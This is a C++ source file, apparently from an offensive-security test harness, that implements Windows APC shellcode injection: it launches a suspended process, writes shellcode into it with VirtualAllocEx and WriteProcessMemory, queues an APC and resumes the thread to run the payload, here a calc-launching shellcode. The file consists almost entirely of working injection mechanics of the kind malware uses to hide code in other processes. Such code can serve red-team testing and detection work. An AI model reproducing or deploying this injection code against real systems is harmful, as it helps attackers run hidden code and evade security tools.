#include "apc_inject_test.h"
#include <direct.h>

namespace test {

// Structure to pass shellcode info to APC routine
struct ShellcodeInfo {
    PVOID shellcodeAddr;
    SIZE_T shellcodeSize;
};

void CALLBACK APCInjectTest::apc_routine(ULONG_PTR param) {
    // Execute shellcode
    ShellcodeInfo* info = reinterpret_cast<ShellcodeInfo*>(param);
    if (info && info->shellcodeAddr) {
        DWORD oldProtect;
        VirtualProtect(info->shellcodeAddr, info->shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
        
        // Execute shellcode
        void (*shellcode)() = reinterpret_cast<void(*)()>(info->shellcodeAddr);
        shellcode();
        
        // Note: We won't reach here if shellcode executes successfully
        VirtualProtect(info->shellcodeAddr, info->shellcodeSize, oldProtect, &oldProtect);
    }
}

bool APCInjectTest::create_suspended_process(PROCESS_INFORMATION& pi) {
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    char current_exe[MAX_PATH];
    char current_dir[MAX_PATH];
    
    GetModuleFileNameA(NULL, current_exe, MAX_PATH);
    GetCurrentDirectoryA(MAX_PATH, current_dir);
    
    utils::FileLogger::log("[APC_TEST] Creating suspended process");
    utils::FileLogger::log("[APC_TEST] Current directory: " + std::string(current_dir));
    utils::FileLogger::log("[APC_TEST] Executable path: " + std::string(current_exe));
    
    if (!CreateProcessA(current_exe, NULL, NULL, NULL, TRUE,
                       CREATE_SUSPENDED | CREATE_NO_WINDOW,
                       NULL, current_dir, &si, &pi)) {
        utils::FileLogger::log("[APC_TEST] Failed to create process. Error: " + std::to_string(GetLastError()));
        return false;
    }

    utils::FileLogger::log("[APC_TEST] Process created successfully. PID: " + std::to_string(pi.dwProcessId));
    return true;
}

PVOID APCInjectTest::allocate_shellcode_in_process(HANDLE hProcess, const std::vector<uint8_t>& shellcode) {
    PVOID shellcodeAddr = VirtualAllocEx(
        hProcess,
        NULL,
        shellcode.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!shellcodeAddr) {
        utils::FileLogger::log("[APC_TEST] Failed to allocate memory for shellcode. Error: " + std::to_string(GetLastError()));
        return nullptr;
    }
    
    if (!WriteProcessMemory(
        hProcess,
        shellcodeAddr,
        shellcode.data(),
        shellcode.size(),
        NULL
    )) {
        utils::FileLogger::log("[APC_TEST] Failed to write shellcode to memory. Error: " + std::to_string(GetLastError()));
        VirtualFreeEx(hProcess, shellcodeAddr, 0, MEM_RELEASE);
        return nullptr;
    }
    
    return shellcodeAddr;
}

bool APCInjectTest::test_apc_shellcode() {
    utils::FileLogger::log("[APC_TEST] Starting APC shellcode injection test");
    
    PROCESS_INFORMATION pi = {};
    if (!create_suspended_process(pi)) {
        return false;
    }

    // Get calc shellcode
    paylo::CalcPayloadStrategy calcPayload;
    std::vector<uint8_t> shellcode = calcPayload.getPayload();
    
    // Allocate and write shellcode in target process
    PVOID shellcodeAddr = allocate_shellcode_in_process(pi.hProcess, shellcode);
    if (!shellcodeAddr) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    
    // Allocate memory for ShellcodeInfo structure
    ShellcodeInfo info = { shellcodeAddr, shellcode.size() };
    PVOID infoAddr = VirtualAllocEx(
        pi.hProcess,
        NULL,
        sizeof(ShellcodeInfo),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!infoAddr) {
        utils::FileLogger::log("[APC_TEST] Failed to allocate memory for shellcode info. Error: " + std::to_string(GetLastError()));
        VirtualFreeEx(pi.hProcess, shellcodeAddr, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    
    if (!WriteProcessMemory(
        pi.hProcess,
        infoAddr,
        &info,
        sizeof(ShellcodeInfo),
        NULL
    )) {
        utils::FileLogger::log("[APC_TEST] Failed to write shellcode info. Error: " + std::to_string(GetLastError()));
        VirtualFreeEx(pi.hProcess, infoAddr, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, shellcodeAddr, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Queue APC
    if (!QueueUserAPC(apc_routine, pi.hThread, reinterpret_cast<ULONG_PTR>(infoAddr))) {
        utils::FileLogger::log("[APC_TEST] Failed to queue APC. Error: " + std::to_string(GetLastError()));
        VirtualFreeEx(pi.hProcess, infoAddr, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, shellcodeAddr, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    utils::FileLogger::log("[APC_TEST] APC queued successfully");

    // Resume thread to execute APC
    ResumeThread(pi.hThread);
    
    // Wait for process to complete
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Cleanup
    VirtualFreeEx(pi.hProcess, infoAddr, 0, MEM_RELEASE);
    VirtualFreeEx(pi.hProcess, shellcodeAddr, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    utils::FileLogger::log("[APC_TEST] APC shellcode test completed");
    return true;
}

bool APCInjectTest::run_apc_test() {
    utils::FileLogger::log("[APC_TEST] Starting APC tests");
    
    // Run APC shellcode test
    bool success = test_apc_shellcode();
    if (!success) {
        utils::FileLogger::log("[APC_TEST] APC shellcode test failed");
        return false;
    }

    utils::FileLogger::log("[APC_TEST] All tests passed");
    return true;
}

} // namespace test 